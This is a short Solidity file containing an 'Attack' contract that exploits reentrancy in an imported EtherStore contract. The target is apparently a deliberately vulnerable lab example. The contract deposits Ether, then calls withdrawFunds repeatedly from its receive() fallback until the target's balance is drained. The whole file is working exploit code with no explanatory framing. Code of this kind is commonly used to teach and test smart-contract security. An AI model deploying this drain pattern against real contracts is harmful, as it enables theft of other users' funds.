//SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {EtherStore} from "./EtherStore.sol";
contract Attack {
    EtherStore public etherStore;
    uint256 public attackAmount;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackDeposit() public payable {
        etherStore.depositFunds{value: msg.value}();
        attackAmount = msg.value;
        etherStore.withdrawFunds();
    }

    receive() external payable {
        if (address(etherStore).balance >= attackAmount) {
            etherStore.withdrawFunds();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
